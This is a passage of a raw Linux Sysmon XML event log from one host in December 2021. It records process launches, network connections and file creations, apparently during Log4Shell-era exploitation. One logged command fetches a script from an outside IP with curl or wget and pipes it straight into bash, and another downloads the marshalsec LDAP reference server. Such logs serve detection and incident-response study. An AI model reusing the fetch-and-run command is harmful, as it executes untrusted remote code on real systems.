Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:09:24.443121000Z"/><EventRecordID>24559355</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:09:24.449</Data><Data Name="ProcessGuid">{ec2d99e9-89c4-61b3-782d-a4dc76550000}</Data><Data Name="ProcessId">7401</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">54876</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">45.155.205.233</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">5874</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:09:24.650604000Z"/><EventRecordID>24559362</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:09:24.656</Data><Data Name="ProcessGuid">{ec2d99e9-89c4-61b3-782d-a4dc76550000}</Data><Data Name="ProcessId">7401</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T19:13:29.283534000Z"/><EventRecordID>24827551</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 19:13:29.289</Data><Data Name="ProcessGuid">{ec2d99e9-a6d9-61b3-700c-6af6b8550000}</Data><Data Name="ProcessId">7623</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget https://raw.githubusercontent.com/mbechler/marshalsec/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</Data><Data Name="CurrentDirectory">/opt/java</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">219</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-8796-61b3-08c4-2a1dfd550000}</Data><Data Name="ParentProcessId">7371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T19:13:29.287784000Z"/><EventRecordID>24827552</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 19:13:29.294</Data><Data Name="ProcessGuid">{ec2d99e9-a6d9-61b3-700c-6af6b8550000}</Data><Data Name="ProcessId">7623</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">55730</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T19:13:29.298021000Z"/><EventRecordID>24827557</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 19:13:29.304</Data><Data Name="ProcessGuid">{ec2d99e9-a6d9-61b3-700c-6af6b8550000}</Data><Data Name="ProcessId">7623</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">57280</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">185.199.110.133</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T19:13:29.477602000Z"/><EventRecordID>24827572</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 19:13:29.483</Data><Data Name="ProcessGuid">{ec2d99e9-a6d9-61b3-700c-6af6b8550000}</Data><Data Name="ProcessId">7623</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="TargetFilename">/opt/java/LDAPRefServer.java</Data><Data Name="CreationUtcTime">2021-12-10 19:13:29.483</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T19:13:29.477917000Z"/><EventRecordID>24827573</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 19:13:29.484</Data><Data Name="ProcessGuid">{ec2d99e9-a6d9-61b3-700c-6af6b8550000}</Data><Data Name="ProcessId">7623</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="TargetFilename">/root/.wget-hsts</Data><Data Name="CreationUtcTime">2021-12-10 19:13:29.484</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T19:13:29.478400000Z"/><EventRecordID>24827574</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 19:13:29.484</Data><Data Name="ProcessGuid">{ec2d99e9-a6d9-61b3-700c-6af6b8550000}</Data><Data Name="ProcessId">7623</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T22:03:08.507518000Z"/><EventRecordID>25206705</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 22:03:08.513</Data><Data Name="ProcessGuid">{ec2d99e9-ce9c-61b3-ecee-10bc91550000}</Data><Data Name="ProcessId">11451</Data><Data Name="Image">/bin/busybox</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">/bin/sh -c (curl -s 45.155.205.233:5874/96.126.96.16:8080||wget -q -O- 45.155.205.233:5874/96.126.96.16:8080)|bash</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">11263</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T22:03:08.508851000Z"/><EventRecordID>25206707</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 22:03:08.514</Data><Data Name="ProcessGuid">{ec2d99e9-ce9c-61b3-ec0e-02199b550000}</Data><Data Name="ProcessId">11452</Data><Data Name="Image">/bin/busybox</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget -q -O- 45.155.205.233:5874/96.126.96.16:8080</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-ce9c-61b3-ecee-10bc91550000}</Data><Data Name="ParentProcessId">11451</Data><Data Name="ParentImage">/bin/busybox</Data><Data Name="ParentCommandLine">/bin/sh</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T07:20:27.558261000Z"/><EventRecordID>26483016</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 07:20:27.563</Data><Data Name="ProcessGuid">{ec2d99e9-513b-61b4-7051-697f80550000}</Data><Data Name="ProcessId">12555</Data><Data Name="Image">/usr/bin/dpkg</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg -l wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">12554</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T07:20:27.560673000Z"/><EventRecordID>26483018</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 07:20:27.563</Data><Data Name="ProcessGuid">{ec2d99e9-513b-61b4-a072-902f2d560000}</Data><Data Name="ProcessId">12555</Data><Data Name="Image">/usr/bin/dpkg-query</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg-query --list -- wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">12554</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T07:20:28.037341000Z"/><EventRecordID>26483230</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 07:20:28.043</Data><Data Name="ProcessGuid">{ec2d99e9-513c-61b4-701c-5aa6e6550000}</Data><Data Name="ProcessId">12583</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget --timeout 60 -U wget/1.19.4-1ubuntu2.2 Ubuntu/18.04.6/LTS GNU/Linux/5.4.0-1060-aws/x86_64 Intel(R)/Xeon(R)/Platinum/8175M/CPU/@/2.50GHz cloud_id/aws -O- --content-on-error https://motd.ubuntu.com</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-513b-61b4-6852-eeb228560000}</Data><Data Name="ParentProcessId">12539</Data><Data Name="ParentImage">/bin/dash</Data><Data Name="ParentCommandLine">/bin/sh</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T07:20:28.041634000Z"/><EventRecordID>26483231</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 07:20:28.047</Data><Data Name="ProcessGuid">{ec2d99e9-513c-61b4-701c-5aa6e6550000}</Data><Data Name="ProcessId">12583</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">60766</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T07:20:28.172656000Z"/><EventRecordID>26483240</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 07:20:28.178</Data><Data Name="ProcessGuid">{ec2d99e9-513c-61b4-701c-5aa6e6550000}</Data><Data Name="ProcessId">12583</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">43664</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">34.243.160.129</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T07:20:28.552875000Z"/><EventRecordID>26483427</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 07:20:28.559</Data><Data Name="ProcessGuid">{ec2d99e9-513c-61b4-701c-5aa6e6550000}</Data><Data Name="ProcessId">12583</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
